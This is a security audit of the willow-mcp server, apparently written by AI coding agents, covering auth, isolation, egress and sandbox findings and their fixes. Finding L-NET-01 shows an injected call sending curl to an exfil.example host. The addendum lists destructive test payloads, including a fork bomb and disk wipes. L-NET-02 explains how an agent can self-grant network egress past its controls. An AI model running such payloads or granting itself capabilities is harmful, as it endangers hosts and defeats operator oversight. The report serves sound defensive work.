---
b17: WMCP1
title: Security Audit — willow-mcp
date: 2026-05-06
auditor: Vishwakarma (Claude Code, Haiku 4.5)
status: resolved
resolved_date: 2026-07-08
resolved_by: Ada (Claude Code, fleet id willow)
---

# Security Audit — willow-mcp

Part of Level 2 full-fleet security audit. willow-mcp — MCP server providing Store (SQLite), Knowledge (Postgres), and Tasks (Kart integration) to fleet agents via stdio transport.

**Scope note (added 2026-07-08):** Original audit (2026-05-06) assessed stdio transport only. Serve mode (HTTP + OAuth 2.0 PKCE) was added later and is covered here only by the L-AUTH-02 and L-DOS-01 findings below, added retroactively — it has not had a full rubric pass of its own.

## Rubric Results

| # | Check | Status | Notes |
|---|---|---|---|
| R1 | SQL injection | ✅ PASS | All Postgres queries use parameterized execute(); no raw string interpolation |
| R2 | Shell injection | ✅ PASS | No subprocess.run(), os.system(), or shell= calls; task submission to Kart is message-based |
| R3 | Path traversal | ✅ PASS | Store uses SQLite in fixed location; no user-controlled path operations |
| R4 | Hardcoded credentials | ✅ PASS | No credentials in code; auth via SAP/1.0 gate (app_id required) |
| R5 | CORS wildcard | N/A | Not applicable — stdio transport, not HTTP |
| R6 | XSS | N/A | Not applicable — server returns JSON, no HTML rendering |
| R7 | Unsigned code execution | ✅ PASS | No eval(), exec(), or dynamic imports; all tools are static MCP definitions |
| R8 | Missing auth on APIs | ✅ PASS (2026-07-08) | Stdio mode: app_id + manifest, fail-closed. Serve mode: fixed by L-AUTH-02 — app_id now resolved from a confirmed identity binding, never from the caller |
| R9 | Bare except swallowing errors | N/A | `openclaw_sap_gate` doesn't exist in current code — see L-AUTH-01 (stale) |
| R10 | Predictable temp paths | ✅ PASS | No temp files created; uses Postgres and SQLite for persistence |
| R11 | Race conditions | ✅ PASS (2026-07-08) | Fixed by L-CONC-01 — Store's lock now covers execute/commit, not just connection lookup |
| R12 | safe_integration.py status() | ✅ PASS (2026-07-08) | Fixed by L-INT-01 — `safe_integration.py` added |
| R13 | Entry point importable | ✅ PASS | __main__.py exists and runs mcp.server.stdio.stdio_server(); can import willow_mcp |
| R14 | requirements.txt pinned | N/A | No requirements.txt exists — see L-REQ-01 (stale, superseded by pyproject.toml) |
| R15 | No hardcoded dev paths | ✅ PASS | No /home/sean or machine-specific paths in code |

## Findings

### P1: L-INT-01 — No safe_integration.py / Willow integration point — RESOLVED

**Severity:** P1
**Status:** Resolved
**Fixed:** 2026-07-08

WLWR1 R12 requires `safe_integration.py` with a `status()` function for Willow bus integration.

willow-mcp is an MCP server but lacks reverse integration — Willow cannot query its status or lifecycle.

**Fix applied:** Added `src/willow_mcp/safe_integration.py` with a `status()` function returning `app_id`, `version` (from `__init__.__version__`), `status`, `tools_registered`, and `postgres_reachable` (live-checked via `db.get_pg()`).

**Impact (historical):** Server was invisible to Willow orchestration / Level 3 audit. Cannot be managed as fleet member.

---

### P2: L-REQ-01 — requirements.txt unpinned — RESOLVED (stale, superseded by rewrite)

**Severity:** P2
**Status:** Resolved — stale
**Re-checked:** 2026-07-08

No `requirements.txt` exists anywhere in the repo (confirmed via repo-wide search). Dependencies are declared in `pyproject.toml` with proper version ranges: `mcp>=1.28.1,<2.0.0`, `psycopg2-binary>=2.9,<3.0`, `cryptography>=42.0,<50.0`, `starlette>=0.36,<1.0`, `uvicorn>=0.29,<1.0`. This finding described a packaging layout (`setup.py`/`requirements.txt` era) that predates the current `pyproject.toml`-based build. No action needed.

---

### P2: L-AUTH-01 — Silent fallback on missing SAP gate — RESOLVED (stale, superseded by rewrite)

**Severity:** P2
**Status:** Resolved — stale
**Re-checked:** 2026-07-08

`openclaw_sap_gate` does not appear anywhere in current source (confirmed via repo-wide search; the only remaining reference was this finding's own text). `gate.py` has since been rewritten entirely around the manifest-based ACL model (`_load_manifest`/`permitted`/`PERMISSION_GROUPS`, fail-closed on missing manifest or empty permissions) with no SAP-gate import or fallback path at all. This finding described code from a version of `gate.py` that no longer exists. No action needed — but see L-AUTH-02, a distinct and current serve-mode auth gap found in the rewritten code.

---

### P0: L-AUTH-02 — Serve-mode OAuth identity is never bound to app_id — RESOLVED

**Severity:** P0
**Status:** Resolved
**Found:** 2026-07-08, during `docs/design/schema-adaptation.md` review — postdates this audit's original date (2026-05-06); not covered by R8's original PASS.
**Fixed:** 2026-07-08

`gate.py`'s own docstring (lines 8-11) states the serve-mode identity model: *"OAuth-verified identity (Google/Apple sub claim) is written into the session before any tool dispatch; gate reads it from the session context."* This was never implemented.

`oauth.py`'s `google_callback` (line 497) and `apple_callback` (line 556) verify the Google/Apple `id_token`, compute `(email, sub)`, then discard both — neither value is attached to the issued access token or passed anywhere `gate.py` can read. Meanwhile `_gate()` and `_guarded()` in `server.py` (lines 103-114, 216-236) derive `app_id` **only from the tool call's own arguments** (`call_kwargs.get("app_id", "")`), never from the authenticated OAuth session:

```python
# server.py — _guarded() wrapper
app_id = call_kwargs.get("app_id", "") or _DEFAULT_APP_ID
...
gate_err = _gate(app_id, tool_name)   # app_id is caller-supplied, not the OAuth identity
```

**Impact:** In serve mode, any client that completes *any* Google or Apple sign-in (their own identity — it doesn't matter whose) can subsequently call every tool with **any `app_id` string of their choosing**, and is granted whatever permissions that manifest happens to list. OAuth authenticates that a human signed in; it grants that human zero specific, bound authorization. This is a full authorization-model defeat for serve mode specifically — stdio mode (the default, audited original transport) is unaffected, since it has no OAuth layer to spoof around.

**Fix applied:** Implemented the identity-binding design from `docs/design/schema-adaptation.md` §6.2-6.3:
- New `identity_binding.py` — `propose_binding`/`confirm_binding`/`resolve_app_id` against a reviewable JSON artifact per `(issuer, subject_id)` at `$WILLOW_HOME/mcp_apps/_identity_bindings/`, starting `confirmed: false`.
- `oauth.py`'s Google/Apple callbacks now call `propose_binding(...)` and thread `(issuer, subject)` through `issue_code` → `exchange_authorization_code`/`exchange_refresh_token` → onto the stored access/refresh token record, and `load_access_token` populates the MCP SDK's `AccessToken.subject`/`.claims["iss"]` fields from it.
- `server.py`'s `_gate()` now resolves the effective `app_id` via `get_access_token()` (the SDK's contextvar for the authenticated session) + `resolve_app_id(issuer, subject)` when in serve mode — the tool call's own `app_id` argument is no longer trusted for authorization. No confirmed binding → denied (fail closed), matching an unmanifested stdio `app_id`. Stdio mode is unchanged.
- `identity_binding.confirm_binding()` is intentionally **not** an MCP tool — it's only reachable via the new `willow-mcp confirm-binding --issuer ... --subject ... --app-id ...` CLI subcommand (see L-DOC-01), so a remote caller can never confirm their own binding.
- `_guarded()`'s wrapper now threads the gate-resolved `effective_app_id` through the rate limiter, tool dispatch, and receipt log, so a serve-mode caller's self-declared `app_id` argument no longer appears anywhere in the authorization or audit trail.
- Verified end-to-end (manual harness, see session record): an authenticated caller supplying an arbitrary `app_id` argument is now resolved to their actual bound identity regardless of what they pass; an authenticated-but-unbound identity is denied.

---

### P2: L-DOS-01 — Unbounded rate-limiter bucket dict, keyed before validation — RESOLVED

**Severity:** P2
**Status:** Resolved
**Found:** 2026-07-08, same review pass as L-AUTH-02.
**Fixed:** 2026-07-08

In `_guarded()` (`server.py:216-234`), `_check_rate(app_id)` runs on the raw, caller-supplied `app_id` string **before** `_gate()` — and therefore before `_validate_app_id`'s regex/length check in `gate.py` — ever executes. The module-global `_buckets: dict[str, _Bucket]` (`server.py:173`) has no maximum size and no eviction policy.

**Impact:** Given L-AUTH-02, any OAuth-authenticated caller (trivial to become, per above) can call a tool with a fresh, arbitrary `app_id` string on every request, growing `_buckets` without bound — an in-memory resource-exhaustion vector. Lower severity than L-AUTH-02 because it requires an active process lifetime to matter and doesn't expose data, but it's real and unauthenticated-by-anything-but-a-login.

**Fix applied:** Reordered `_guarded()`'s pipeline to `sanitize -> gate -> rate check -> dispatch -> receipt` (was `sanitize -> rate check -> gate -> ...`). `_gate()` validates `app_id` (via `gate.permitted` → `_validate_app_id`) before any `_check_rate` call can happen, so an invalid/arbitrary string is denied before it ever becomes a `_buckets` key. As a side effect of L-AUTH-02, `_check_rate` in serve mode is now keyed on the gate-resolved bound `app_id`, not a caller-supplied string, closing the growth vector entirely for that transport.

---

### P2: L-BUG-01 — Empty-string search query crashes with malformed SQL — RESOLVED

**Severity:** P2
**Status:** Resolved
**Found:** 2026-07-08, full-repo pass via codebase-memory-mcp.
**Fixed:** 2026-07-08

`db.py:Store.search` and `server.py:knowledge_search` both build their `WHERE` clause by joining one condition per whitespace-split query token:

```python
tokens = query.split()
conditions = " AND ".join(["data LIKE ?"] * len(tokens))   # db.py:Store.search
...
rows = conn.execute(f"... WHERE deleted = 0 AND {conditions}", params)
```

When `query` is `""` or whitespace-only, `tokens == []`, so `conditions == ""` — producing malformed SQL (`WHERE deleted = 0 AND ` in SQLite; `WHERE ` or `WHERE  AND domain = %s` in Postgres for `knowledge_search`). This raises an unhandled `sqlite3.OperationalError` / `psycopg2` exception. Unlike the other Postgres-backed tools (`fleet_status`, `fleet_health`, `agent_route`), `knowledge_search` does not wrap its `cur.execute` in `try/except`, so the exception propagates through `_guarded()`'s `except Exception: ...; raise` path as a hard tool failure rather than the `{"error": ...}` shape every other failure mode in this pipeline returns.

**Impact:** Any permitted caller can crash `store_search`, `store_search_all` (iterates `search` per collection), or `knowledge_search` with a trivial empty-string argument — a cheap, easily-triggered reliability bug, not data-damaging. Also the reason it was never caught: `tests/test_store.py`'s search tests only use non-empty queries (see L-TEST-01).

**Fix applied:** Added an early `if not tokens: return []` (SQLite) / `return {"results": []}` (Postgres) guard, before the SQL string is built, in both `Store.search` and `knowledge_search`. Regression tests added in `tests/test_store.py`.

---

### P2: L-CONC-01 — Store._conn()'s lock doesn't cover query execution — RESOLVED

**Severity:** P2
**Status:** Resolved
**Found:** 2026-07-08, full-repo pass via codebase-memory-mcp.
**Fixed:** 2026-07-08

`db.py:Store._conn()` takes `self._lock` only around the connection-dict lookup/creation:

```python
def _conn(self, collection: str) -> sqlite3.Connection:
    with self._lock:
        if collection not in self._conns:
            ...
            conn = sqlite3.connect(str(db_path), check_same_thread=False)
            ...
        return self._conns[collection]
```

but `put`/`get`/`update`/`search`/`delete` all call `conn.execute(...)` / `conn.commit()` **outside** that lock, against a connection opened with `check_same_thread=False`. Python's `sqlite3` module explicitly leaves serialization of concurrent statement execution on a shared connection to the caller when `check_same_thread=False` is set — nothing here does that.

**Impact:** Two concurrent tool calls against the same collection (e.g. two `store_put`/`store_update` calls racing) can interleave statement execution on the same connection object, risking `sqlite3.OperationalError` ("database is locked" or similar) or, in the worst case, undefined interleaving of uncommitted state. The original audit's R11 "PASS" ("Store operations are atomic via SQLite transactions") only reasoned about single-statement atomicity, not concurrent multi-call access to a shared connection.

**Fix applied:** `self._lock` changed from `threading.Lock` to `threading.RLock` (re-entrant, since methods now call `self._conn()` from inside their own lock) and widened to cover the full `conn.execute(...)`/`commit()` sequence in `put`/`get`/`all`/`update`/`search`/`delete`, not just the connection-dict lookup. Regression test (`test_concurrent_put_does_not_raise`, 8 threads × 20 writes) added in `tests/test_store.py`.

---

### P2: L-TEST-01 — Test suite covers one file of seven — RESOLVED

**Severity:** P2
**Status:** Resolved
**Found:** 2026-07-08, full-repo pass via codebase-memory-mcp.
**Fixed:** 2026-07-08

All 12 tests in the repo (`tests/test_store.py`) exercise `db.py`'s `Store` class exclusively. There is zero test coverage for `gate.py`, `oauth.py`, `vault.py`, `receipts.py`, or any of `server.py`'s actual MCP tool endpoints, `_sanitize`, `_check_rate`, or the `_guarded` pipeline that wires them together.

**Impact:** L-AUTH-02, L-DOS-01, and L-BUG-01 above all sit in completely untested code paths — this is structurally why they went unnoticed. Any fix to those findings should land with a regression test, and the auth/gate/rate-limit pipeline as a whole has no safety net today.

**Fix applied:** Added `tests/conftest.py` (isolates all `WILLOW_HOME`-derived paths to a tmp dir before any module import, since `server.py` creates its `Store`/`ReceiptLog` at import time) plus four new test files: `test_gate.py` (8 tests — manifest fail-closed cases, group expansion, invalid app_id), `test_vault.py` (7 — read/write round-trip, 0600 perms, missing-key-but-db-present), `test_identity_binding.py` (7 — propose/confirm/resolve, idempotent re-sign-in, per-issuer scoping, path-traversal rejection), `test_server.py` (8 — `_sanitize`, `_check_rate` burst/limit, `_guarded` permission denial and fail-closed-on-missing-manifest). Plus 3 new regression tests in `test_store.py` for L-BUG-01 and L-CONC-01. Full suite: 44 tests passing (was 12).

---

### P3: L-DOC-01 — `willow-mcp setup` CLI referenced but never implemented — RESOLVED

**Severity:** P3
**Status:** Resolved
**Found:** 2026-07-08, full-repo pass via codebase-memory-mcp.
**Fixed:** 2026-07-08

`oauth.py`'s header comment and the OAuth approval page's "unconfigured" HTML (`_UNCONFIGURED_MSG` in `oauth.py`) both instruct the operator to run:

```
willow-mcp setup --google-client-id ID --google-client-secret SECRET
```

to populate the vault with IdP credentials. `server.py:main()`'s `argparse` setup (lines 636-647) only defines `--serve`, `--port`, and `--host` — no `setup` subcommand exists anywhere in the package (confirmed via repo-wide search; the only two hits for "setup" are this comment and the HTML string).

**Impact:** Low severity — not a vulnerability, a completeness gap. Anyone following the documented path to configure Google/Apple Sign-In hits a dead end; the only way to write `google.client_id` etc. today is calling `Vault.write()` directly in a one-off script.

**Fix applied:** Implemented `willow-mcp setup` (`--google-client-id`/`--apple-team-id` etc., prompting via `getpass`/stdin for secrets whenever the corresponding flag is omitted, so a client-secret or private key need never appear in shell history or a process listing). Also added `willow-mcp confirm-binding` (required by L-AUTH-02's design — CLI-only, never an MCP tool, so identity-binding confirmation can only happen locally on the host).

---

### P0: L-NET-01 — Sandbox network gate bypassable via caller-supplied task text — RESOLVED

**Severity:** P0
**Status:** Resolved
**Found:** 2026-07-08, external session-based review (`docs/design/mcp-review-2026-07-08.md` §2a) — postdates the original audit; a regression against B-19's fix, which closed only the `allow_net=True` path.
**Fixed:** 2026-07-08

The Kart worker (`willow-2.0/core/kart_sandbox.py`) decides a task's network policy purely by scanning the *stored task text* for a directive line — `task_allows_network()` grants egress on any line where `line.strip() == "# allow_net"`, and `task_allows_localhost()` likewise for `# allow_localhost`. In `server.py:task_submit`, both the `task_net` permission check and the `# allow_net` append lived behind the same `if allow_net:` guard:

```python
if allow_net:
    ...gate.permitted(app_id, gate.NET_PERMISSION)...   # only runs when allow_net=True
...
if allow_net:
    task = task.rstrip("\n") + "\n# allow_net"           # only appended when allow_net=True
```

Nothing inspected or stripped caller-supplied `task` text. An app holding only `task_queue` (never granted `task_net`) could submit with the default `allow_net=False`:

```python
task_submit(app_id="...", task="curl https://exfil.example\n# allow_net", allow_net=False)
```

The gate never runs (it is keyed off the *argument*, not the *text*), the directive line is stored verbatim, and the worker builds the sandbox with egress enabled. The same applies to `# allow_localhost`, which `task_submit` never gates at all.

**Impact:** Full defeat of the `task_net` capability separation that B-19 established — any `task_queue` holder gets arbitrary sandbox network egress (data exfiltration, C2, dependency fetch) without ever holding the escalated permission. Stdio and serve modes both affected. Same outcome B-19 closed, via a path B-19's fix did not cover.

**Fix applied:** In `task_submit`, caller-supplied lines matching either directive (`# allow_net` / `# allow_localhost`, using the worker's exact `line.strip() ==` comparison) are now stripped from `task` **unconditionally**, *before* the permission-gated append. The `# allow_net` directive can therefore only enter the stored text through the code path that has already verified `task_net`; `# allow_localhost` can never be self-granted. Regression tests added in `tests/test_server.py` (`test_task_submit_strips_caller_supplied_net_directive_when_denied`, `test_task_submit_strips_caller_supplied_localhost_directive`, `test_task_submit_permitted_net_survives_caller_directive_dedup`). Tracked as B-21 in `docs/BUGS.md`.

---

### P1: L-NET-02 — A host-side agent can self-grant its own egress — MITIGATED, NOT CLOSED

**Severity:** P1
**Status:** Mitigated — the remaining step is a deployment change, not a code change
**Found:** 2026-07-08, demonstrated in-session while landing B-29
**Mitigated:** 2026-07-09 (B-32: time-boxed leases, strict-trust-root mode, PreToolUse guard)

B-14 made `$WILLOW_HOME/mcp_apps` a `bound_ro` mount *inside the Kart sandbox*, precisely so an untrusted runtime could not rewrite the ACL that gates it. But the agent driving the session does not run inside that sandbox. It holds ordinary file tools and can write `"task_net"` into its own manifest, then call `task_submit(allow_net=True)`. B-29's `consent.internet` is a second file in the same directory tree, writable by the same uid.

This inverts the **sudo invariant** (FRANK `90e52ab7`): *the model may REQUEST egress, never CONFIRM it; request and confirm are separate authorities.* Under §0.1 the witness may not be the actor; under §0.3 nothing may extend its own reach. The escalation was demonstrated in-session with operator approval in chat — but the *mechanism* never required that approval, and an approval the machine cannot check is not a control.

**Impact:** An agent with file-write access to `$WILLOW_HOME` can grant itself sandbox network egress and use it, with no operator action. This does not cross a trust boundary the OS is enforcing (agent and server share a uid by default), so it is P1 rather than P0: it defeats a policy control, not a kernel one.

**Mitigations applied (B-32):**

1. **Egress is now a time-boxed lease.** `task_net` in the manifest is demoted to a capability ("this app may ever *ask*"); the grant itself is a record under `mcp_apps/_net_leases/<app_id>.json` with an issuer, a reason, and a deadline capped at 3h (FRANK `cc553729`). A self-granted lease *expires* and *leaves an attributed record*, where a self-granted boolean persisted silently and forever.
2. **No MCP tool can mint a lease.** Issuance is local-CLI-only (`willow-mcp grant-net`), exactly as `confirm_binding` is (L-AUTH-02). Leases are read fail-closed: expired, unparseable, naive-timestamped, over-ceiling, or naming a different `app_id` than the file they sit in all deny.
3. **The sandbox lane is fully closed.** Leases live under `mcp_apps/`, so they inherit B-14's `bound_ro` mount. Verified: `lease.grant()` from inside the Kart sandbox raises `OSError(EROFS)` and no file appears.
4. **The residual is reported, never implied away.** `diagnostic_summary.checks.net_lease.self_writable` lists exactly which authorizing keys the running process could forge. `WILLOW_MCP_STRICT_TRUST_ROOT=1` turns that into a refusal (`trust_root_denied`).
5. **The PreToolUse hook blocks the crossing** — `grant-net`, a write under `_net_leases/`, or an edit adding `task_net` to a manifest. A hook is a guardrail in the agent's own harness, not a control; it makes the boundary visible where it would be crossed.

**Not closed.** On a single-uid host the agent can still write the lease. It must now forge a *third* artifact, with a clock, under audit — but the operating system is not stopping it. **Strict mode is off by default**, because enabling it before uid separation exists would deny egress on every current install. The genuine fix is ownership: `chown` `mcp_apps/` and `mcp_apps/_net_leases/` to a uid the agent's process does not run as, then set `WILLOW_MCP_STRICT_TRUST_ROOT=1`. That is a deployment step this repo can support and check but cannot perform. Tracked as B-32 in `docs/BUGS.md`.

---

### P0: L-ISO-01 — `store_*` tools have no cross-app isolation — RESOLVED

**Severity:** P0
**Status:** Resolved
**Found:** 2026-07-08, external session-based review (`docs/design/mcp-review-2026-07-08.md` §2b), re-confirmed 2026-07-08 on a second pass after B-21/B-22/B-23 landed — untouched by that diff.
**Fixed:** 2026-07-08

`context_*` tools are correctly namespaced per app: `_ctx_collection(app_id)` returns `f"ctx__{app_id}"` (`server.py:1047-1048`), so one app can never see another's context records. `store_*` tools have no equivalent. `store_put`/`store_get`/`store_list`/`store_update`/`store_search`/`store_delete` (`server.py:428-488`) all take `app_id` only for the `_guarded` gate/rate-limit check, then call into `db.py`'s `Store` methods with the bare, caller-supplied `collection` string and nothing else — `app_id` is discarded before it ever reaches storage. `db.py` has zero references to `app_id` anywhere (confirmed via repo-wide search). `_validate_collection` (`db.py:24-30`) only checks the string is filesystem-safe, not that it belongs to the calling app.

`store_search_all` (`server.py:489-491`) makes the blast radius explicit — it is documented as searching "across ALL SOIL collections," by design, with no per-app filter.

**Impact:** Any app whose manifest grants `store_read`/`store_write`/`store_all`/`full_access` can read, write, or delete **every other app's** SOIL store data, not just its own — either by guessing/enumerating collection names or trivially via `store_search_all`. This is a full defeat of per-app data isolation for one of the two persistent-storage primitives this server exposes (the other, `context_*`, has the isolation `store_*` lacks). Unlike L-NET-01/L-AUTH-02, this does not require chaining through a separate permission — any legitimate, intentionally-scoped `store_read` grant is sufficient to read data the granter never intended to expose.

**Fix applied:** Added an opt-in `store_scope` manifest field rather than a blanket per-app rename — `context_*`'s `ctx__<app_id>` prefix approach would have silently broken the *documented, intentional* fleet-sharing use of `WILLOW_STORE_ROOT` (README's "share data" note; confirmed live via `diagnostic_summary` that pre-existing collections like `agents`/`hanuman`/`knowledge`/`session` are genuinely shared with the wider Willow fleet, not an accident). Instead:
- `db.collection_in_scope(collection, scope)` (`db.py`) — `scope=None` (unset) stays unrestricted, today's default; a list of exact names and/or `prefix*` wildcards confines matches; an empty list denies everything.
- `gate.store_scope(app_id)` / `gate.collection_permitted(app_id, collection)` (`gate.py`) — reads an optional `store_scope` array from the app's manifest.
- **Fail-closed on an unreadable scope (follow-up, 2026-07-08).** The first cut of `gate.store_scope` returned `None` — *unrestricted* — for an invalid `app_id`, a missing or unparseable manifest, and a malformed `store_scope`, logging a warning and continuing. That inverted the module's own stated contract (`gate.py` header: "Fail-closed: missing app_id, missing manifest, or empty permissions → deny") in exactly the case where it matters: an operator who writes `"store_scope": "myapp_*"` — a string, the obvious typo for this field — would get an app with full store access and a log line, while believing it was confined. Server logs are not a control. All three paths now return `[]` (deny-all); an explicit `null` still means "no policy declared" and stays unrestricted, since that is a declaration rather than a defect. Malformed scope logs at `ERROR` naming the field and the type received. Five regression tests in `tests/test_gate.py` pin each path.
- All six single-collection tools (`store_put`/`get`/`list`/`update`/`search`/`delete`, `server.py`) now check `gate.collection_permitted` before touching storage, returning `collection_denied` (list-shaped for list-returning tools, matching the existing `list_error` convention) rather than silently proceeding.
- `store_search_all` now passes the app's `store_scope` into `Store.search_all(query, scope=...)`, so a scoped app's search confines to its own collections instead of the whole store — closing the specific blast-radius amplifier called out above.
- Documented in README's Authorization section (`store_scope` subsection) with a worked example.
- An app with no `store_scope` is completely unaffected — verified via a dedicated regression test (`test_store_put_unscoped_app_unaffected`) so this fix cannot regress the shared-fleet-store default.

**Residual:** this is opt-in, not a retroactive lockdown — an app with `full_access` and no `store_scope` still sees everything, exactly as before. Closing the *default* posture (e.g. isolate-by-default with an explicit opt-in for sharing) would be a breaking change requiring migration of every existing manifest and is left as a deliberate follow-up decision, not bundled into this fix. Note the residual is now precisely "no policy declared → unrestricted": a *declared* policy that cannot be read denies, so the gap is the default, not the mechanism. Tests: `tests/test_gate.py` (13 new), `tests/test_store.py` (7 new), `tests/test_server.py` (9 new) — 257 total, all passing.

---

## Summary

| Priority | Count | Items |
|---|---|---|
| P0 | 0 open, 3 resolved | L-ISO-01 (resolved), L-AUTH-02 (resolved), L-NET-01 (resolved) |
| P1 | 1 mitigated, 1 resolved | **L-NET-02 (mitigated, not closed)**, L-INT-01 (resolved) |
| P2 | 0 open, 6 resolved-or-stale | L-REQ-01 (stale), L-AUTH-01 (stale), L-DOS-01 (resolved), L-BUG-01 (resolved), L-CONC-01 (resolved), L-TEST-01 (resolved) |
| P3 | 0 | — (L-DOC-01 resolved) |

**Every P0 is resolved or confirmed stale.** One P1 — **L-NET-02**, a host-side agent self-granting egress — is **mitigated but not closed**: leases now make a self-grant expire, attribute it, and surface it, and strict mode will refuse it outright, but the last step (uid separation via `chown`) is a deployment change this repo can check and cannot perform. Do not read the rest of this summary as saying otherwise.

Summary of what changed on 2026-07-08:
- **L-AUTH-02 (P0)** — serve-mode identity binding implemented (`identity_binding.py` + `oauth.py`/`gate.py`/`server.py` wiring + `willow-mcp confirm-binding` CLI). Verified end-to-end.
- **L-NET-01 (P0)** — `task_submit` now strips caller-supplied net directives unconditionally before the permission-gated append.
- **L-ISO-01 (P0)** — `store_*` tools gained opt-in per-app collection scoping (`store_scope` manifest field); unscoped apps keep today's shared-fleet-store default.
- **L-INT-01 (P1)** — `safe_integration.py` added.
- **L-DOS-01, L-BUG-01, L-CONC-01, L-TEST-01 (P2)** — all fixed; see each finding's "Fix applied" note.
- **L-REQ-01, L-AUTH-01 (P2)** — confirmed stale (already superseded by an earlier rewrite, no action needed).
- **L-DOC-01 (P3)** — `willow-mcp setup` and `willow-mcp confirm-binding` CLI subcommands implemented.
- Test suite grew from 12 tests (1 file) to 252 tests — all passing.

And on 2026-07-09:
- **L-NET-02 (P1)** — egress became a **three-key** operation: the `task_net` capability, the operator's `consent.internet`, and a time-boxed, operator-issued **lease** (`willow-mcp grant-net`, ≤3h, no MCP tool can mint one). Leases read fail-closed and inherit B-14's `bound_ro` sandbox mount, so the sandbox lane is closed outright. The host-side lane is narrowed and reported, not closed — see the finding.

**Assessment:** Both stdio mode (default) and serve mode (HTTP + OAuth) now meet the same bar:
- ✅ Parameterized SQL queries (no injection)
- ✅ Manifest-based auth gating on all tools, fail-closed — in serve mode, gated on a confirmed identity binding, not a caller-supplied argument
- ✅ Store operations serialized correctly under concurrency
- ✅ Store operations can be isolated per app via opt-in `store_scope` (default remains shared, by design — see L-ISO-01)
- ✅ No eval/exec/dynamic imports
- ✅ Proper use of MCP SDK, including its auth-context primitives
- ✅ safe_integration.py present for fleet orchestration visibility
- ✅ Meaningful test coverage across all seven source files
- ⚠️ Egress is gated by three keys, all of which live in files the server's own uid can write on a default single-uid install — narrowed and reported, not enforced by the OS (L-NET-02)

**Recommendation:** L-ISO-01's fix is opt-in, not a new default — any deployment running multiple apps with only partial trust in each other on one willow-mcp instance should add `store_scope` to each app's manifest rather than relying on the unscoped default, since `full_access`/`store_read` without it still implies read access to every other app's data (single-operator, single-trust-domain deployments are unaffected either way, the same accepted trust model noted for stdio `app_id` elsewhere in this doc). Any deployment where the agent process is not fully trusted should additionally `chown` `mcp_apps/` (including `_net_leases/`) to a separate uid and set `WILLOW_MCP_STRICT_TRUST_ROOT=1`, per L-NET-02 — without that, the three egress keys are policy, not enforcement. No open items from this audit block a serve-mode deployment or PyPI publish with OAuth enabled. Before publishing, re-run a fresh audit pass specifically against serve mode's current (now-fixed) state — this document's rubric was written stdio-first and augmented for serve mode reactively; a clean-slate pass would catch anything this incremental process missed.

---

## Addendum — Live adversarial audit (2026-07-09)

Unlike the rubric pass above (static review), this addendum records results from
**driving the running server** over the real MCP stdio protocol with hostile
input. Method: two rounds — the first surfaced confounders (Pydantic arg-
validation errors, a missing `knowledge` table, and the rate limiter masking
deeper controls), which were de-confounded and re-run so each verdict reflects
the control it actually exercises; plus a direct battery against the Kart
security scanner and a sandbox filesystem-tamper probe.

### Live re-validation — controls confirmed against the running server

| Surface | Probe(s) | Result |
|---|---|---|
| Protocol | garbage bytes, non-JSON-RPC, call-before-init, unknown method, 10 MB line, 5k-deep nested JSON | server survives, stays up, still completes a valid handshake |
| Auth / gate | empty & unmanifested `app_id` (fail-closed), `../willow` traversal, gate-denied tools, `deny_tools`, orchestrator `human_only` + `dispatch_id` | all denied |
| Store scope | cross-lane write (`collection_denied`), `../../tmp` (`illegal path characters`), `record_id` `../etc/passwd` (`not_found`) | contained |
| SQL injection | `' OR '1'='1`, `DROP TABLE`, `UNION SELECT` against a real table holding a secret row | parameterized — injections return empty, secret surfaces only on a legitimate match, table intact |
| Egress | `allow_net=True` → `net_denied` (first of three keys) | denied |
| Sandbox | netns isolation (separate inode, no routes); **manifest write → `Read-only file system`** | isolated; ACL trust roots immutable from inside the sandbox |
| Rate limiting | 20-call burst | 10/20 throttled |

### New findings

#### P2: L-DOS-02 — Kart scanner has no resource-exhaustion coverage — OPEN (fix at source)

`kartikeya.check_kart_task` blocks `rm -rf /`, `curl|sh`, reverse shells, `chmod
-R 777 /`, and `mkfs`, but **passes the entire resource-exhaustion class**: fork
bomb (`:(){ :|:& };:`), CPU spin (`while :; do :; done`), disk fill (`dd
if=/dev/zero`), and memory hog all reach the sandbox. The bwrap sandbox mitigates
with a 120 s timeout + PID namespace, but imposes **no memory / CPU / PID cgroup
limits**, so a detonating bomb can degrade the host for up to the timeout window (`KART_POLL_TIMEOUT`
120 s default; `KART_DAEMON_TIMEOUT` 1800 s). `--unshare-pid` confines PID
*visibility* but does not by itself prevent host global-PID exhaustion without a
`pids.max` cgroup. Authenticated-caller only (requires `task_queue` + a confirmed
mapping + past the rate limiter). The scanner lives in the **`kartikeya`**
dependency, not this repo. *Remediation (two parts):* (1) DONE — resource-
exhaustion + missing-destructive patterns added to `kartikeya`'s `security_scan`
(fork bomb / spin / disk-fill / `find / -delete` / raw-device write), verified
against a live worker. (2) OPEN — a `memory.max`/`pids.max`/`cpu.max` cgroup cap
on the sandbox child, the only defense for the non-pattern-detectable memory-hog
class and any novel bomb the denylist misses. Also DONE — willow-mcp's
`task_submit` now runs `check_kart_task` at **submit time**, before any DB work,
so a scanner-refused task is denied before it ever occupies a queue slot (the
worker still re-scans at execution). Verified live: a fork bomb is refused at
submit and creates no queue row.

#### P3: L-CMD-01 — Kart scanner destructive-class gaps — OPEN (fix at source)

`find / -delete` and `cat /dev/zero > /dev/sda` **pass** the scanner despite being
equivalent to `rm -rf /` / a disk wipe (both of which *are* caught). In this
configuration bwrap's ephemeral filesystem, read-only trust-root binds, and
absent device nodes contain them (verified: a sandboxed write to the ACL manifest
returns `Read-only file system`), so they are not exploitable against the host —
but the scanner should not depend solely on the sandbox for the destructive class.
Same location/remediation as L-DOS-02.

#### ~~P3: L-DOS-03 — No record-size limit on the SOIL store~~ — RETRACTED (false finding)

Original observation: `store_put` appeared to accept a 5 MB record. **This was a
harness artifact** — the probe only checked for a raised Python exception, not a
returned `{"error"}`. On re-test, `store_put` **rejects** it:
`sanitize: 'record' exceeds 512KB limit (5000012 bytes)`. `_sanitize()`
(`server.py`, run inside `_guarded()` on every call) already enforces
`_MAX_BLOB_BYTES = 512 KB` on `record`/`context`/`value` dicts, `_MAX_STR_BYTES =
64 KB` with null-byte stripping on `content`/`task`/`query`/…, `_MAX_TAGS`/
`_MAX_TAG_LEN` on `tags`/`sources`, and path-traversal rejection on `collection`.
No record-size gap exists.

**Assessment:** the security architecture held under live fire — fail-closed
gating, parameterized SQL, sandbox network+filesystem isolation, read-only ACL
trust roots, three-key egress, and rate limiting all confirmed against the
running server. The only real gap is coverage in the sandboxed executor's static
scanner (L-DOS-02 / L-CMD-01), which is contained for the filesystem class by the
sandbox and localized to the `kartikeya` dependency.

*ΔΣ=43*
